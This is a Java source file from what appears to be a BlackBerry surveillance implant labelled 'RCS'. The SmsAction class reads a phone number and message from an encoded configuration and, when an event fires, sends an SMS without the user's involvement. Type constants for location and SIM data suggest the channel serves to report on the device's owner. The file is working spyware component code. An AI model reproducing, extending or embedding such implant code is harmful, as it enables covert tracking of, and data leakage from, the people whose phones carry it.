/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;
import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.util.DataBuffer;
import blackberry.event.Event; 
import blackberry.utils.Check; 
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsAction.
 */
public final class SmsAction extends SubAction {

    private static final int TYPE_LOCATION = 1;
    private static final int TYPE_SIM = 2;
    private static final int TYPE_TEXT = 3;

    String number;
    String text;
    int type;

    /**
     * Instantiates a new sms action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public SmsAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        // #debug info
        debug.info("Sending sms to: " + number + " message:" + text);
        try {
            final MessageConnection conn = (MessageConnection) Connector
                    .open("sms://");
            // generate a new text message
            final TextMessage tmsg = (TextMessage) conn
                    .newMessage(MessageConnection.TEXT_MESSAGE);
            // set the message text and the address
            tmsg.setAddress("sms://" + number);
            tmsg.setPayloadText(text);
            // finally send our message

            conn.send(tmsg);
        } catch (final InterruptedIOException e) {
            // #debug
            debug.error("Cannot sending sms to: " + number + " ex:" + e);
            return false;
        } catch (final IOException e) {
            // #debug
            debug.error("Cannot sending sms to: " + number + " ex:" + e);
            return false;
        }
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            type = databuffer.readInt();

            //#ifdef DBC
            Check.asserts(type > 1 && type <= 3, "wrong type");
            //#endif

            int len = databuffer.readInt();
            byte[] buffer = new byte[len];
            databuffer.read(buffer);
            number = WChar.getString(buffer, true);

            if (type == TYPE_TEXT) {
                len = databuffer.readInt();
                buffer = new byte[len];
                databuffer.read(buffer);
                text = WChar.getString(buffer, true);
            }

        } catch (final EOFException e) {

            return false;
        }

        //#mdebug
        StringBuffer sb = new StringBuffer();
        sb.append("type: " + type);
        sb.append("number: " + number);
        sb.append("text: " + text);
        //#debug info
        debug.info(sb.toString());
        //#enddebug

        return true;
    }

}
